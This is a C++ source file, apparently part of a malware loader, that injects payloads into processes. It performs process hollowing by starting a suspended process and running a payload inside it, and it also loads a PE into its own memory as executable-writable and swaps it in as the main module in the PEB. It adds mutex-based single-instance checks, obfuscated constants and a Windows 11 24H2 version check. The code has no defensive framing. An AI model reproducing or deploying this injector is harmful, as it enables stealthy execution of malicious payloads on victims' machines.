#include "inject.h"
#include "run_pe.h"
#include "common.h"
#include "obfuscateu.h"
#include "peconv/pe_loader.h"
#include "peconv/pe_hdrs_helper.h"
#include "peconv/peb_lookup.h"

#define CHECK_STATUS_AND_CLEANUP(status) { if(!NT_SUCCESS(status)) { UtTerminateProcess(pi.hProcess, 0); return INVALID_HANDLE_VALUE; } }
bool g_PatchRequired = false;

bool isWindows1124H2OrLater() {
    NTSYSAPI NTSTATUS RtlGetVersion(PRTL_OSVERSIONINFOW lpVersionInformation);

    RTL_OSVERSIONINFOW osVersionInfo = {0};
    osVersionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

    HMODULE hNtdll = GetModuleHandleA("ntdll");
    if (!hNtdll) return false; // should never happen

    auto _RtlGetVersion = reinterpret_cast<decltype(&RtlGetVersion)>(GetProcAddress(hNtdll, "RtlGetVersion"));
    NTSTATUS status = _RtlGetVersion(
            &osVersionInfo
    );
    if (status != S_OK) {
        return false;
    }
    // Check major version and build number for Windows 11
    if (osVersionInfo.dwMajorVersion > 10 ||
        (osVersionInfo.dwMajorVersion == 10 && osVersionInfo.dwBuildNumber >= 26100)) {
        return true;
    }
    return false;
}

bool
inject_process(wchar_t *mutex, BYTE *payload, size_t payloadSize, LPWSTR programPath, LPWSTR cmdLine,
               LPWSTR startDir, LPWSTR runtimeData) {
    if (!check_mutex(mutex)) {
        if (isWindows1124H2OrLater()) {
            g_PatchRequired = true;
        }
        PROCESS_INFORMATION pi = create_new_process_internal(programPath, cmdLine, startDir, runtimeData, 0,
                                                             AYU_OBFC(THREAD_CREATE_FLAGS_CREATE_SUSPENDED));
        return run_pe_memory(payload, payloadSize, pi);
    }
    return true;
}

bool inject_self(wchar_t *mutex, BYTE *payload, size_t payloadSize) {
    size_t payloadImageSize = 0;
    BYTE *loaded_pe = peconv::load_pe_executable(payload, payloadSize, payloadImageSize);
    ULONGLONG image_base = peconv::get_image_base(loaded_pe);
    VirtualAlloc(reinterpret_cast<LPVOID>(image_base), payloadImageSize, MEM_COMMIT | MEM_RESERVE,
                 PAGE_EXECUTE_READWRITE);
    memcpy(reinterpret_cast<LPVOID>(image_base), loaded_pe, payloadImageSize);
    peconv::set_main_module_in_peb((HMODULE)loaded_pe);
}